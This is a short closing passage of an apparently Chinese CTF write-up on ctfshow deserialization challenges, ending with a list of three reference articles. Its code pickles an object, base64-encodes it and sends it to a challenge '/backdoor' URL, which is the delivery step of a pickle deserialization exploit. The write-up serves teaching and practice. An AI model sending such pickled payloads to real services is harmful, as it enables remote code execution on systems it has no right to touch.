s = pickle.dumps(a)
s_base64 = base64.b64encode(s)

url = 'http://ae2307a8-9301-4c31-bb56-a70b7eb3af9b.challenge.ctf.show/backdoor'
params={
    'data': s_base64
}

requests.get(url, params)
```





## 参考文章

[CTFshow-WEB入门-反序列化_feng-CSDN](https://blog.csdn.net/rfrder/article/details/113808539)
[ctfshow 反序列化篇 - TARI TARI](https://tari.moe/2021/04/06/ctfshow-unserialize/index.html?_sw-precache=da0cdc87e859025cf24d7fe3c0a91fcc)
[ctfshow 反序列化 - 羽 csdn](https://blog.csdn.net/miuzzx/article/details/110558192)

